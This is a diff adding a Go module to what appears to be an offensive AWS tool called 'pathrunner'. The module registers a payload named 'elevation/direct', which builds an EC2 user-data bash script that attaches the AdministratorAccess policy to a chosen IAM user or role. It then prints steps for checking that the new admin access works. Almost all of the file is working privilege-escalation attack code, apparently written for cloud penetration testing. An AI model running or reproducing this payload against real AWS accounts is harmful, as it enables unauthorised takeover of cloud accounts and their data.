@@ -1,0 +1,155 @@
+package ec2
+
+import (
+	"encoding/json"
+	"fmt"
+	"pathrunner/pkg/modules"
+	"pathrunner/pkg/payloads"
+	"strings"
+)
+
+type DirectElevationPayload struct{}
+
+func NewDirectElevationPayload() *DirectElevationPayload {
+	return &DirectElevationPayload{}
+}
+
+func init() {
+	payloads.Register(NewDirectElevationPayload())
+}
+
+func (p *DirectElevationPayload) GetName() string {
+	return "elevation/direct"
+}
+
+func (p *DirectElevationPayload) GetDescription() string {
+	return "Directly elevate starting principal by attaching AdministratorAccess policy via user-data script"
+}
+
+func (p *DirectElevationPayload) GetTags() []string {
+	return []string{
+		payloads.TagServiceEC2,
+		payloads.TagLanguageBash,
+		payloads.TagTechniqueDirectAction,
+		payloads.TagTransportOutput,
+	}
+}
+
+func (p *DirectElevationPayload) GetOptions() []modules.Option {
+	return []modules.Option{
+		{
+			Name:        "TARGET_PRINCIPAL_TYPE",
+			Description: "Type of principal to elevate (user or role)",
+			Required:    true,
+			Default:     "user",
+		},
+		{
+			Name:        "TARGET_PRINCIPAL_NAME",
+			Description: "Name of the IAM user or role to elevate",
+			Required:    true,
+		},
+		{
+			Name:        "POLICY_ARN",
+			Description: "ARN of policy to attach (default: AdministratorAccess)",
+			Required:    false,
+			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
+		},
+	}
+}
+
+func (p *DirectElevationPayload) GenerateCode(options map[string]string) (string, error) {
+	principalType := options["TARGET_PRINCIPAL_TYPE"]
+	if principalType == "" {
+		principalType = "user"
+	}
+
+	principalName := options["TARGET_PRINCIPAL_NAME"]
+	policyArn := options["POLICY_ARN"]
+	if policyArn == "" {
+		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
+	}
+
+	var attachCommand string
+	if principalType == "user" {
+		attachCommand = fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", principalName, policyArn)
+	} else if principalType == "role" {
+		attachCommand = fmt.Sprintf("aws iam attach-role-policy --role-name %s --policy-arn %s", principalName, policyArn)
+	} else {
+		return "", fmt.Errorf("invalid TARGET_PRINCIPAL_TYPE: %s (must be 'user' or 'role')", principalType)
+	}
+
+	userDataScript := fmt.Sprintf(`#!/bin/bash
+exec > >(tee /var/log/pathrunner-elevation.log|logger -t pathrunner -s 2>/dev/console) 2>&1
+
+echo "Pathrunner Direct Elevation Payload"
+echo "Target: %s (%s)"
+echo "Policy: %s"
+echo ""
+
+# Wait for instance role to be fully available
+echo "Waiting for IAM role to be available..."
+sleep 10
+
+# Attach policy to target principal
+echo "Attaching policy to %s..."
+%s
+
+if [ $? -eq 0 ]; then
+    echo "SUCCESS: Policy attached to %s"
+    echo "Target principal now has elevated permissions"
+else
+    echo "FAILED: Could not attach policy (exit code: $?)"
+fi
+
+echo "Elevation attempt complete"
+`, principalName, principalType, policyArn, principalName, attachCommand, principalName)
+
+	return userDataScript, nil
+}
+
+func (p *DirectElevationPayload) ProcessResult(result string) (string, error) {
+	// For EC2 user-data payloads, result is typically instance metadata
+	var instanceData map[string]interface{}
+	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
+		// If not JSON, return as-is
+		return result, nil
+	}
+
+	var output strings.Builder
+	output.WriteString("=== Direct Elevation Payload Results ===\n\n")
+
+	if instanceID, ok := instanceData["instance_id"].(string); ok {
+		output.WriteString("Instance ID: " + instanceID + "\n")
+	}
+
+	if state, ok := instanceData["state"].(string); ok {
+		output.WriteString("Instance State: " + state + "\n")
+	}
+
+	output.WriteString("\nUser-Data Script Status:\n")
+	output.WriteString("The elevation script is executing on the EC2 instance.\n")
+	output.WriteString("It will attempt to attach the policy to the target principal.\n\n")
+
+	output.WriteString("To verify elevation:\n")
+	output.WriteString("1. Wait 2-3 minutes for the script to complete\n")
+	output.WriteString("2. Check if the policy was attached to your principal\n")
+	output.WriteString("3. Test admin access with: aws iam list-users\n\n")
+
+	output.WriteString("To check script logs:\n")
+	output.WriteString("aws ec2 get-console-output --instance-id <INSTANCE_ID>\n")
+
+	return output.String(), nil
+}
+
+func (p *DirectElevationPayload) Validate(options map[string]string) error {
+	if options["TARGET_PRINCIPAL_NAME"] == "" {
+		return fmt.Errorf("TARGET_PRINCIPAL_NAME is required for elevation/direct payload")
+	}
+
+	principalType := options["TARGET_PRINCIPAL_TYPE"]
+	if principalType != "" && principalType != "user" && principalType != "role" {
+		return fmt.Errorf("TARGET_PRINCIPAL_TYPE must be 'user' or 'role'")
+	}
+
+	return nil
+}
